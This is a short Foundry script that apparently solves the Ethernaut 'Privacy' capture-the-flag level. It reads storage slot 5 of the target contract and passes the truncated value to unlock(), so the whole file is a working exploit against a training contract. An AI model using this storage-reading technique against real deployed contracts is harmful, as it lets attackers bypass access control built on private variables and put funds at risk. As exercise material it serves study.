// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "src/ethernaut/PrivacyExploit.sol";

// Estimated total gas used for script: 282380
contract PrivacyScript is Script {
    // address elevatorAddress = vm.envAddress("ELEVATOR_ADDRESS");

    function run() external {
        // Load Elevator contract instance using interface
        
        // Get private key from .env file
        uint attackerKey = vm.envUint("PRIVATE_KEY");

        // Set attacker as the msg.sender for all subsequent transactions.
        vm.startBroadcast(attackerKey);
        Privacy level12 = Privacy(0x8e53f966B34e487aD3e2D6f111D7e9e57859774b);


        bytes32 myKey = vm.load(address(level12), bytes32(uint256(5)));
        level12.unlock(bytes16(myKey));
        vm.stopBroadcast();
    }
}